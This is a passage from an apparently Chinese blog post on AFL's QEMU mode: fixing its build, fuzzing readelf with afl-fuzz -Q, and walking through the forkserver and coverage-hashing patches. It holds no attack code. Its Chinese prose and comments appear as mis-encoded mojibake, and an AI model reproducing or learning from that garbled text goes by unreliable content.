bash">$ bash build_qemu_support.sh<br></code></pre></td></tr></tbody></table></figure><p><strong>é”™è¯¯1</strong>ï¼šå¦‚æœå‡ºç°ä¸‹é¢çš„æŠ¥é”™ä¿¡æ¯ï¼Œåˆ™å°†<code>build_qemu_support.sh</code>è„šæœ¬çš„ç¬¬148-150è¡Œçš„<code>./configure</code>æœ«å°¾æ·»åŠ ä¸€ä¸ª<code>--python=/path/to/python_bin</code>å³å¯ï¼š</p><figure class="highlight subunit"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs subunit">...<br><span class="hljs-keyword">ERROR: </span>Cannot use 'python', Python 2.6 or later is required.<br>       Note that Python 3 or later is not yet supported.<br>       Use --python=/path/to/python to specify a supported Python.<br></code></pre></td></tr></tbody></table></figure><p>e.g.</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">CFLAGS="-O3 -ggdb" ./configure --disable-system \<br>  --enable-linux-user --disable-gtk --disable-sdl --disable-vnc \<br>  --target-list="${CPU_TARGET}-linux-user" --enable-pie --enable-kvm --python=/usr/bin/python2.7 || exit 1<br></code></pre></td></tr></tbody></table></figure><p><strong>é”™è¯¯2</strong>ï¼šå¦‚æœå‡ºç°ä¸‹é¢çš„æŠ¥é”™ä¿¡æ¯ï¼ŒåŸå› æ˜¯glibc wrapperæ›´æ”¹æ‰€è‡´ï¼Œè§£å†³åŠæ³•æ˜¯å°†ä¸‹è¿°è¡¥ä¸æ·»åŠ åˆ°patches/syscall.pathä¸­ï¼š</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">error: static declaration of â€˜gettidâ€™ follows non-static declaration<br>error: â€˜SIOCGSTAMPâ€™ undeclared here (not <span class="hljs-keyword">in</span> a <span class="hljs-keyword">function</span>); did you mean â€˜SIOCSRARPâ€™?<br>error: â€˜SIOCGSTAMPNSâ€™ undeclared here (not <span class="hljs-keyword">in</span> a <span class="hljs-keyword">function</span>); did you mean â€˜SIOCGSTAMP_OLDâ€™?<br></code></pre></td></tr></tbody></table></figure><p><strong>Patch</strong>ï¼ˆsyscall1.patchï¼‰:</p><figure class="highlight diff"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-comment">--- qemu-2.10.0-rc3-clean/linux-user/syscall.c2017-08-15 11:39:41.000000000 -0700</span><br><span class="hljs-comment">+++ qemu-2.10.0-rc3/linux-user/syscall.c2017-08-22 14:34:03.193088186 -0700</span><br><span class="hljs-meta">@@ -111,6 +111,7 @@</span><br> #include &lt;linux/if_bridge.h&gt;<br> #endif<br> #include &lt;linux/audit.h&gt;<br><span class="hljs-addition">+#include &lt;linux/sockios.h&gt;</span><br> #include "linux_loop.h"<br> #include "uname.h"<br><br><span class="hljs-meta">@@ -116,6 +116,8 @@</span><br> <br> #include "qemu.h"<br> <br><span class="hljs-addition">+extern unsigned int afl_forksrv_pid;</span><br><span class="hljs-addition">+</span><br> #ifndef CLONE_IO<br> #define CLONE_IO                0x80000000      /* Clone io context */<br> #endif<br><span class="hljs-meta">@@ -256,6 +257,7 @@</span><br> #endif<br> <br> #ifdef __NR_gettid<br><span class="hljs-addition">+#define __NR_sys_gettid __NR_gettid</span><br><span class="hljs-deletion">-_syscall0(int, gettid)</span><br><span class="hljs-addition">+_syscall0(int, sys_gettid)</span><br> #else<br> /* This is a replacement for the host gettid() and must return a host<br><span class="hljs-meta">@@ -11688,8 +11690,21 @@</span><br>         break;<br> <br>     case TARGET_NR_tgkill:<br><span class="hljs-deletion">-        ret = get_errno(safe_tgkill((int)arg1, (int)arg2,</span><br><span class="hljs-deletion">-                        target_to_host_signal(arg3)));</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+        {</span><br><span class="hljs-addition">+          int pid  = (int)arg1,</span><br><span class="hljs-addition">+              tgid = (int)arg2,</span><br><span class="hljs-addition">+              sig  = (int)arg3;</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+          /* Not entirely sure if the below is correct for all architectures. */</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+          if(afl_forksrv_pid &amp;&amp; afl_forksrv_pid == pid &amp;&amp; sig == SIGABRT)</span><br><span class="hljs-addition">+              pid = tgid = getpid();</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+          ret = get_errno(safe_tgkill(pid, tgid, target_to_host_signal(sig)));</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+        }</span><br><span class="hljs-addition">+</span><br>         break;<br> <br> #ifdef TARGET_NR_set_robust_list<br></code></pre></td></tr></tbody></table></figure><p>é‡æ–°è¿è¡Œè„šæœ¬ï¼</p><p><img src="/2023/07/20/%E5%85%B3%E4%BA%8EQEMU%E5%92%8CAFL-QEMU%E6%A8%A1%E5%BC%8F%E9%82%A3%E4%BA%9B%E4%BA%8B/1.png"></p><p>Now, just enjoy it!:happy:</p><h3 id="2-2-ä½¿ç”¨"><a href="#2-2-ä½¿ç”¨" class="headerlink" title="2.2 ä½¿ç”¨"></a>2.2 ä½¿ç”¨</h3><p>ä½¿ç”¨æ–¹æ³•å¾ˆç®€å•ï¼Œä»…éœ€åœ¨afl-fuzzä¸­æ·»åŠ -Qå‚æ•°å³å¯ã€‚ä¾‹å¦‚ï¼Œå¯¹ubuntuæ“ä½œç³»ç»Ÿè‡ªå¸¦çš„readelfè¿›è¡Œæ¨¡ç³Šæµ‹è¯•ï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">afl-fuzz -m none -Q -i /home/xiechen/fuzzing-corpus/exe/mopt/ -o out_readelf -d readelf -a @@<br></code></pre></td></tr></tbody></table></figure><p><img src="/2023/07/20/%E5%85%B3%E4%BA%8EQEMU%E5%92%8CAFL-QEMU%E6%A8%A1%E5%BC%8F%E9%82%A3%E4%BA%9B%E4%BA%8B/2.png"></p><h3 id="2-3-åŸç†-4"><a href="#2-3-åŸç†-4" class="headerlink" title="2.3 åŸç†[4]"></a>2.3 åŸç†[4]</h3><blockquote><p><code>qemu</code> åœ¨æ‰§è¡Œä¸€ä¸ªç¨‹åºæ—¶ï¼Œä»è¢«æ‰§è¡Œç¨‹åºçš„å…¥å£ç‚¹å¼€å§‹å¯¹åŸºæœ¬å—ç¿»è¯‘å¹¶æ‰§è¡Œï¼Œä¸ºäº†æå‡æ•ˆç‡ï¼Œ<code>qemu</code>ä¼šæŠŠç¿»è¯‘å‡ºæ¥çš„åŸºæœ¬å—å­˜æ”¾åˆ° <code>cache</code> ä¸­ï¼Œå½“ <code>qemu</code> è¦æ‰§è¡Œä¸€ä¸ªåŸºæœ¬å—æ—¶é¦–å…ˆåˆ¤æ–­åŸºæœ¬å—æ˜¯å¦åœ¨ <code>cache</code> ä¸­ï¼Œå¦‚æœåœ¨ <code>cache</code> ä¸­åˆ™ç›´æ¥æ‰§è¡ŒåŸºæœ¬å—ï¼Œå¦åˆ™ä¼šç¿»è¯‘åŸºæœ¬å—å¹¶æ‰§è¡Œã€‚</p></blockquote><p>åœ¨<a href="https://github.com/google/AFL/blob/master/qemu_mode/patches/cpu-exec.diff">cpu-exec.diff</a>ä¸­ï¼Œ<code>afl-qemu-cpu-inl.h</code>æ˜¯AFLä¸ºé€‚ç”¨äºQEMUçš„forkserverå’Œè¦†ç›–ç‡ç»Ÿè®¡çš„å¤´æ–‡ä»¶ï¼š</p><h4 id="2-3-1-AFL-QEMU-CPU-SNIPPET2"><a href="#2-3-1-AFL-QEMU-CPU-SNIPPET2" class="headerlink" title="2.3.1 AFL_QEMU_CPU_SNIPPET2"></a>2.3.1 AFL_QEMU_CPU_SNIPPET2</h4><ul><li><code>AFL_QEMU_CPU_SNIPPET2</code>è¢«æ¤å…¥åˆ°<code>cpu-exec.c</code>çš„<code>cpu_tb_exec()</code>å‡½æ•°ä¸­ï¼Œè¯¥å‡½æ•°ç”¨äºæ‰§è¡Œä¸€ä¸ªTBï¼Œå¹¶æ ¹æ®éœ€è¦ä¿®å¤CPUçŠ¶æ€ï¼›</li></ul><figure class="highlight diff"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-comment">--- qemu-2.10.0-rc3-clean/accel/tcg/cpu-exec.c2017-08-15 11:39:41.000000000 -0700</span><br><span class="hljs-comment">+++ qemu-2.10.0-rc3/accel/tcg/cpu-exec.c2017-08-22 14:34:55.868730680 -0700</span><br><span class="hljs-meta">@@ -36,6 +36,8 @@</span><br> #include "sysemu/cpus.h"<br> #include "sysemu/replay.h"<br> <br><span class="hljs-addition">+#include "../patches/afl-qemu-cpu-inl.h"</span><br><span class="hljs-addition">+</span><br> /* -icount align implementation. */<br> <br> typedef struct SyncClocks {<br><span class="hljs-meta">@@ -144,6 +146,8 @@</span><br>     int tb_exit;<br>     uint8_t *tb_ptr = itb-&gt;tc_ptr;<br> <br><span class="hljs-addition">+    AFL_QEMU_CPU_SNIPPET2;</span><br><span class="hljs-addition">+</span><br>     qemu_log_mask_and_addr(CPU_LOG_EXEC, itb-&gt;pc,<br>                            "Trace %p [%d: " TARGET_FMT_lx "] %s\n",<br>                            itb-&gt;tc_ptr, cpu-&gt;cpu_index, itb-&gt;pc,<br><span class="hljs-meta">@@ -365,6 +369,7 @@</span><br>             if (!tb) {<br>                 /* if no translated code available, then translate it now */<br>                 tb = tb_gen_code(cpu, pc, cs_base, flags, 0);<br><span class="hljs-addition">+                AFL_QEMU_CPU_SNIPPET1;</span><br>             }<br> <br>             mmap_unlock();<br></code></pre></td></tr></tbody></table></figure><ul><li><p><a href="https://github.com/google/AFL/blob/master/qemu_mode/patches/afl-qemu-cpu-inl.h"><code>AFL_QEMU_CPU_SNIPPET2</code></a>ï¼šè¿™é‡Œçš„æ€è·¯å’ŒAFLåŸºäºæ±‡ç¼–çš„æ’æ¡©ä¸€è‡´ï¼Œå°±æ˜¯åœ¨QEMUæ‰§è¡Œæ¯ä¸€ä¸ªTBä¹‹å‰ï¼Œåˆ¤æ–­å½“å‰çš„PCæ˜¯å¦ä¸ºå…¥å£ç‚¹ï¼ˆ<code>afl_entry_point</code> åœ¨ <a href="https://github.com/google/AFL/blob/master/qemu_mode/patches/elfload.diff">elfload.c</a>ä¸­è¢«èµ‹å€¼ï¼‰ã€‚å¦‚æœæ˜¯å…¥å£ç‚¹ï¼Œåˆ™åœ¨æ­¤å¤„è·å–å…±äº«å†…å­˜åŒºåŸŸåœ°å€ï¼Œå¹¶å¯ç”¨forkserverã€‚è¯·æ³¨æ„ï¼Œè¿™é‡Œçš„<code>afl_forkserver</code>å…¶å®æ˜¯ä¸€ä¸ªæ­»å¾ªç¯ï¼Œä¹Ÿå°±æ˜¯æ•´ä¸ªelfç¨‹åºåœ¨è¿™é‡Œè¢«é˜»å¡ï¼Œç›´åˆ°fuzzeræœ‰æ•°æ®éœ€è¦ç¨‹åºè¿è¡Œæ—¶æ‰ä¼šforkå‡ºä¸€ä¸ªå­è¿›ç¨‹</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> AFL_QEMU_CPU_SNIPPET2 do { \</span><br><span class="hljs-meta">    <span class="hljs-keyword">if</span>(itb-&gt;pc == afl_entry_point) { \</span><br><span class="hljs-meta">      afl_setup(); \</span><br><span class="hljs-meta">      afl_forkserver(cpu); \</span><br><span class="hljs-meta">    } \</span><br><span class="hljs-meta">    afl_maybe_log(itb-&gt;pc); \</span><br><span class="hljs-meta">  } while (0)</span><br></code></pre></td></tr></tbody></table></figure><ul><li><code>afl_entry_point</code>ï¼š<ul><li><code>elfload.c</code>å¯ä»¥çœ‹ä½œæ˜¯åŒ…å«QEMUè½½å…¥ELFæ–‡ä»¶ç›¸å…³æ“ä½œçš„ä¸€ä¸ªcæ–‡ä»¶ï¼Œå…¶ä¸­<code>load_elf_image()</code>å‡½æ•°ç”¨ä»¥å°†ELFé•œåƒè½½å…¥åˆ°åœ°å€ç©ºé—´ä¸­ã€‚è¿™é‡Œçš„<code>info-&gt;entry</code>å…¶å®å°±æ˜¯ELFæ–‡ä»¶å…¥å£åœ°å€ï¼Œå…¶å€¼ä¸º<code>ehdr-&gt;e_entry + load_bias</code>ã€‚æ³¨æ„åˆ°è¿™é‡Œæœ‰ä¸€ä¸ª<code>load_bias</code>ï¼Œè¿™ä¸ªå€¼å…¶å®ä¸Šæ˜¯ELFæ–‡ä»¶åŠ è½½åˆ°å†…å­˜ä¸­çš„ä¸€ä¸ªåå·®å€¼ã€‚</li><li>åœ¨<code>elfload.c</code>å¤„å°†<code>afl_entry_point</code>èµ‹å€¼ä¸ºELFæ–‡ä»¶çš„å…¥å£åœ°å€ï¼Œç„¶ååœ¨ç¿»è¯‘æ¯ä¸ªTBä¹‹å‰åˆ¤æ–­è¯¥TBæ˜¯å¦ä¸ºåˆå§‹å—ï¼Œå¦‚æœä¸ºåˆå§‹å—ï¼Œåˆ™åœ¨æ­¤å¤„è®¾ç½®forkserverï¼Œè¿™é‡Œçš„æƒ³æ³•ä¸AFLçš„æ’æ¡©é€»è¾‘æ˜¯ä¸€è‡´çš„ã€‚</li></ul></li></ul><figure class="highlight diff"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-comment">--- qemu-2.10.0-rc3-clean/linux-user/elfload.c2017-08-15 11:39:41.000000000 -0700</span><br><span class="hljs-comment">+++ qemu-2.10.0-rc3/linux-user/elfload.c2017-08-22 14:33:57.397127516 -0700</span><br><span class="hljs-meta">@@ -20,6 +20,8 @@</span><br> <br> #define ELF_OSABI   ELFOSABI_SYSV<br> <br><span class="hljs-addition">+extern abi_ulong afl_entry_point, afl_start_code, afl_end_code;</span><br><span class="hljs-addition">+</span><br> /* from personality.h */<br> <br> /*<br><span class="hljs-meta">@@ -2085,6 +2087,8 @@</span><br>     info-&gt;brk = 0;<br>     info-&gt;elf_flags = ehdr-&gt;e_flags;<br> <br><span class="hljs-addition">+    if (!afl_entry_point) afl_entry_point = info-&gt;entry;  // </span><br><span class="hljs-addition">+</span><br>     for (i = 0; i &lt; ehdr-&gt;e_phnum; i++) {<br>         struct elf_phdr *eppnt = phdr + i;<br>         if (eppnt-&gt;p_type == PT_LOAD) {<br><span class="hljs-meta">@@ -2118,9 +2122,11 @@</span><br>             if (elf_prot &amp; PROT_EXEC) {<br>                 if (vaddr &lt; info-&gt;start_code) {<br>                     info-&gt;start_code = vaddr;<br><span class="hljs-addition">+                    if (!afl_start_code) afl_start_code = vaddr;</span><br>                 }<br>                 if (vaddr_ef &gt; info-&gt;end_code) {<br>                     info-&gt;end_code = vaddr_ef;<br><span class="hljs-addition">+                    if (!afl_end_code) afl_end_code = vaddr_ef;</span><br>                 }<br>             }<br>             if (elf_prot &amp; PROT_WRITE) {<br></code></pre></td></tr></tbody></table></figure></li></ul><h4 id="2-3-2-AFL-QEMU-CPU-SNIPPET1"><a href="#2-3-2-AFL-QEMU-CPU-SNIPPET1" class="headerlink" title="2.3.2 AFL_QEMU_CPU_SNIPPET1"></a>2.3.2 AFL_QEMU_CPU_SNIPPET1</h4><ul><li><p><a href="https://github.com/google/AFL/blob/master/qemu_mode/patches/afl-qemu-cpu-inl.h"><code>AFL_QEMU_CPU_SNIPPET1</code></a>è¢«æ¤å…¥åˆ°QEMUçš„<code>tb_find()</code>å‡½æ•°ä¸­ã€‚<code>tb_find()</code>å‡½æ•°ç”¨äºåœ¨å“ˆå¸Œè¡¨ä¸­å¯»æ‰¾å½“å‰PCæ‰€å¯¹åº”çš„TBï¼Œå¦‚æœæ²¡æ‰¾ç€è¯¥TBï¼Œåˆ™è°ƒç”¨<code>tb_gen_code()</code>æ¥è¿›è¡ŒåŠ¨æ€ç¿»è¯‘ï¼Œä¹‹åä¾¿é™„åŠ ä¸Šäº†<code>AFL_QEMU_CPU_SNIPPET1</code>æ‰€å¯¹åº”çš„ä»£ç ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> AFL_QEMU_CPU_SNIPPET1 do { \</span><br><span class="hljs-meta">    afl_request_tsl(pc, cs_base, flags); \</span><br><span class="hljs-meta">  } while (0)</span><br><br>...<br><br><span class="hljs-comment">/* This code is invoked whenever QEMU decides that it doesn't have a</span><br><span class="hljs-comment">   translation of a particular block and needs to compute it. When this happens,</span><br><span class="hljs-comment">   we tell the parent to mirror the operation, so that the next fork() has a</span><br><span class="hljs-comment">   cached copy. */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">afl_request_tsl</span><span class="hljs-params">(target_ulong pc, target_ulong cb, <span class="hljs-type">uint64_t</span> flags)</span> {<br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">afl_tsl</span> <span class="hljs-title">t</span>;</span><br><br>  <span class="hljs-keyword">if</span> (!afl_fork_child) <span class="hljs-keyword">return</span>;<br><br>  t.pc      = pc;<br>  t.cs_base = cb;<br>  t.flags   = flags;<br><br>  <span class="hljs-keyword">if</span> (write(TSL_FD, &amp;t, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> afl_tsl)) != <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> afl_tsl))<br>    <span class="hljs-keyword">return</span>;<br><br>}<br></code></pre></td></tr></tbody></table></figure><p>è¿™é‡Œå°†å½“å‰TBçš„ä¿¡æ¯ä¿å­˜åˆ°ç»“æ„ä½“<code>afl_tsl</code>ä¸­ï¼Œå¹¶å°†è¯¥ä¿¡æ¯å‘é€å›fuzzerã€‚è€Œ<code>afl_wait_tsl()</code>å‡½æ•°å°±æ˜¯ç”¨æ¥ç­‰å¾…forkå­è¿›ç¨‹é€šè¿‡ç®¡é“ä¼ é€’å›<code>afl_tsl</code>çš„ä¿¡æ¯ï¼š</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">afl_wait_tsl</span><span class="hljs-params">(CPUState *cpu, <span class="hljs-type">int</span> fd)</span> </span>{<br><br>  <span class="hljs-keyword">struct</span> <span class="hljs-title class_">afl_tsl</span> t;<br>  TranslationBlock *tb;<br><br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {<br><br>    <span class="hljs-comment">/* Broken pipe means it's time to return to the fork server routine. */</span><br><span class="hljs-comment">/* æ³¨æ„åˆ°è¿™é‡Œæ˜¯ä¸€ä¸ªæ­»å¾ªç¯ï¼Œä¸æ–­åœ°è·å–TBçš„ç›¸å…³ä¿¡æ¯ï¼Œé‚£è¿™é‡Œåœ¨ä»€ä¹ˆæ—¶å€™breakå‘¢ï¼Ÿå­è¿›ç¨‹æ€æ­»æˆ–è€…å…³é—­äº†ç®¡é“ä¹‹åå°±ä¼šbreak */</span> <br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">read</span>(fd, &amp;t, <span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> afl_tsl)) != <span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> afl_tsl))<br>      <span class="hljs-keyword">break</span>;<br><span class="hljs-comment">/* ä¸‹é¢è¿™éƒ¨åˆ†çš„ä»£ç æ˜¯ä¸æ˜¯æœ‰ç‚¹å¤šä½™ï¼Ÿå› ä¸ºåœ¨cpu-exec.cä¸­å…¶å®å·²ç»å­˜åœ¨æœ‰ç›¸åŒçš„å¤„ç†é€»è¾‘äº† */</span> <br>    tb = <span class="hljs-built_in">tb_htable_lookup</span>(cpu, t.pc, t.cs_base, t.flags);<br><br>    <span class="hljs-keyword">if</span>(!tb) {<br>      <span class="hljs-built_in">mmap_lock</span>();<br>      <span class="hljs-built_in">tb_lock</span>();<br>      <span class="hljs-built_in">tb_gen_code</span>(cpu, t.pc, t.cs_base, t.flags, <span class="hljs-number">0</span>);<br>      <span class="hljs-built_in">mmap_unlock</span>();<br>      <span class="hljs-built_in">tb_unlock</span>();<br>    }<br><br>  }<br><br>  <span class="hljs-built_in">close</span>(fd);<br><br>}<br></code></pre></td></tr></tbody></table></figure><p>è¿™é‡Œçš„<code>struct afl_tsl t</code>å°±æ˜¯è±¡å¾æ€§çš„è·å–ä¸€ä¸‹ï¼Œåœ¨åç»­çš„æµç¨‹ä¸­å¹¶æ²¡æœ‰ä½¿ç”¨ï¼Œè¿™é‡Œå…¶å®å°±æ˜¯ç›‘æ§å­è¿›ç¨‹çŠ¶æ€çš„ä¸€ä¸ªå¤„ç†è¿‡ç¨‹ã€‚</p></li></ul><h4 id="2-3-3-afl-maybe-log"><a href="#2-3-3-afl-maybe-log" class="headerlink" title="2.3.3 afl_maybe_log()"></a>2.3.3 afl_maybe_log()</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">afl_maybe_log</span><span class="hljs-params">(abi_ulong cur_loc)</span> {<br><br>  <span class="hljs-type">static</span> __thread abi_ulong prev_loc;<br><br>  <span class="hljs-comment">/* Optimize for cur_loc &gt; afl_end_code, which is the most likely case on</span><br><span class="hljs-comment">     Linux systems. */</span><br><br>  <span class="hljs-keyword">if</span> (cur_loc &gt; afl_end_code || cur_loc &lt; afl_start_code || !afl_area_ptr)<br>    <span class="hljs-keyword">return</span>;<br><br>  <span class="hljs-comment">/* Looks like QEMU always maps to fixed locations, so ASAN is not a</span><br><span class="hljs-comment">     concern. Phew. But instruction addresses may be aligned. Let's mangle</span><br><span class="hljs-comment">     the value to get something quasi-uniform. */</span><br><br>  cur_loc  = (cur_loc &gt;&gt; <span class="hljs-number">4</span>) ^ (cur_loc &lt;&lt; <span class="hljs-number">8</span>); <span class="hljs-comment">// æ³¨æ„è¿™é‡Œçš„è½¬æ¢æ“ä½œï¼</span><br>  cur_loc &amp;= MAP_SIZE - <span class="hljs-number">1</span>;<br><br>  <span class="hljs-comment">/* Implement probabilistic instrumentation by looking at scrambled block</span><br><span class="hljs-comment">     address. This keeps the instrumented locations stable across runs. */</span><br><br>  <span class="hljs-keyword">if</span> (cur_loc &gt;= afl_inst_rms) <span class="hljs-keyword">return</span>;<br><br>  afl_area_ptr[cur_loc ^ prev_loc]++;<br>  prev_loc = cur_loc &gt;&gt; <span class="hljs-number">1</span>;<br><br>}<br></code></pre></td></tr></tbody></table></figure><ul><li><span class="github-emoji"><span>ğŸ¤”</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f914.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <code>cur_loc</code>æ˜¯PCï¼Œæ³¨æ„åˆ°è¿™é‡Œçš„ç´¢å¼•å€¼ä¸º<code>(cur_loc &gt;&gt; 4) ^ (cur_loc &lt;&lt; 8)</code>ï¼šä»£ç æ³¨é‡Šä¸­è¯´æŒ‡ä»¤åœ°å€å¯èƒ½å¯¹é½äº†ï¼Œå› æ­¤å¯¹è¯¥ç´¢å¼•å€¼è¿›è¡Œäº†ä¿®æ”¹ã€‚è¿™é‡Œå…¶å®å…³é”®çš„é—®é¢˜åœ¨äºæŒ‡ä»¤åœ°å€ç©ºé—´è¿œå¤§äºå“ˆå¸Œä½å›¾çš„å¤§å°ï¼Œæ¢è¨€ä¹‹å¾ˆå®¹æ˜“å‘ç”Ÿç¢°æ’ã€‚æˆ‘ä»¬è¿™é‡Œå‡è®¾PCå€¼ï¼ˆ32ä½ï¼‰ä¸º0x04001234ï¼Œå‡è®¾ä¸‹ä¸€æ¬¡PCå€¼ï¼ˆ32ä½ï¼‰ä¸º0x04011234ï¼Œé‚£ä¹ˆå¦‚æœä¸è¿›è¡Œä¸Šè¿°çš„ä¿®æ”¹ï¼Œä¸<code>MAP_SIZE</code>ä¸çš„ç»“æœæ˜¯ç›¸åŒçš„ï¼Œå› æ­¤ä¼šé€ æˆå¾ˆä¸¥é‡çš„å“ˆå¸Œä½å›¾ç¢°æ’é—®é¢˜ï¼Œè€Œä¸”è¿™ä¸ªç”±äºPCå€¼æœ¬èº«ç©ºé—´èŒƒå›´å¾ˆå¤§ï¼Œå› æ­¤è¿™ç§å“ˆå¸Œä½å›¾ç¢°æ’é—®é¢˜æ ¼å¤–çš„ä¸¥é‡ã€‚æ‰€ä»¥è¿™é‡Œå¿…é¡»è¿›è¡Œç›¸å…³çš„è½¬æ¢æ“ä½œæ¥é¿å…PCå€¼çš„ç¢°æ’ï¼Œä»è€Œæœ‰æ•ˆåŒºåˆ†ä¸åŒPCå€¼ï¼ˆi.e.ä¸åŒçš„åŸºæœ¬å—ï¼‰ã€‚</li></ul><h3 id="2-4-æ”¹è¿›"><a href="#2-4-æ”¹è¿›" class="headerlink" title="2.4 æ”¹è¿›"></a>2.4 